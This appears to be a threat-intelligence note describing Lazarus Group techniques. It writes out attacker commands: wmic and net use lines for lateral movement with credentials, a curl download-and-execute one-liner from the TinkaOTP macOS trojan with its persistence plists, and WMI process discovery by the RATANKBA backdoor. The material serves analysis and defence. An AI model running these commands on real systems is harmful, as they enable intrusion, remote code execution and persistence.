# Lazarus Group

## Features

1. Used when moving transverse:net use \\[IP]\IPC$ "[password]" /u:"[username]" > $temp\~tmp5936t.tmp 2>&1",Command to establish a network connection with the remote host, and then use WMI to copy the malicious software to the remote host.

```bash
wmic.exe /node:[IP] /user:"[username]" /password:"[password]" PROCESS CALL CREATE "cmd.exe /c $appdata\Adobe\adobe.bat"
wmic.exe /node:[IP] /user:"[username]" /password:"[password]" PROCESS CALL CREATE "cmd /c sc queryex helpsvc > $temp\tmp001.dat"
```

2. The two variants of TinkaOTP Trojan Horse for MacOS are Mach-O binary files disguised as .nib files, and the second version does not carry payload，Instead, embed its C2 address into the main execution file of the TinkaOTP package, and use the command：curl -k -o ~/Library/.mina https://domain/wp-content/uploads/2020/01/images.tgz.001 > /dev/null 2>&1 && chmod +x ~/Library/.mina > /dev/null 2>&1 && ~/Library/.mina > /dev/null 2>&1，download payload.
After that, TinkaOTP Trojan passed /LaunchAgents/com.aex-loop.agent.plist and /Library/LaunchDaemons/com.aex-loop.agent.plist, to maintain persistence.

3. The RATANKBA backdoor will use WMI to collect the running process, command line, and session ID information of the infected host and send it to the C2 server.

```bash
"C:\Windows\system32\cmd.exe" /c "wmic process get processid,commandline,sessionid | findstr SysWOW"
"C:\Windows\system32\cmd.exe" /c "wmic process get processid,commandline,sessionid | findstr x86"
//Display running process, command line, session ID
```
